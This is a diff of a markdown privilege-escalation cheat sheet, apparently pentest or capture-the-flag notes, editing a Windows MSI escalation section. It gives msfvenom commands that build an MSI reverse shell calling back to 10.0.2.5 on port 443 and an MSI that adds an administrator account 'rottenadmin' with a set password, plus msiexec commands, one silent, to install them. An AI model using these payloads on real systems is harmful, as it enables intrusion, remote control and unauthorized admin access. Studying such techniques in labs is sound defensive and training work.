@@ -174,11 +174,17 @@
    ```
 2. Add new user OR direct revshell
    ```
-    msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.5 LPORT=443 -a x64 --platform Windows -f msi > payload.msi
+    
     [OR]
-    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.5 LPORT=443 -a x64 --platform Windows -f msi -o evil.msi
+    
+    msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi
    ``` 
-3. Run the msi ``` msiexec /i "C:\xampp\htdocs\shenzi\test.msi" ```
+3. Run the msi
+    ``` 
+        msiexec /q /i payload.msi
+        msiexec /i "C:\xampp\htdocs\shenzi\test.msi"
+    ```
 
 ## Unquoted Service paths
 - unquoted path: windows will try to start exe follow this order
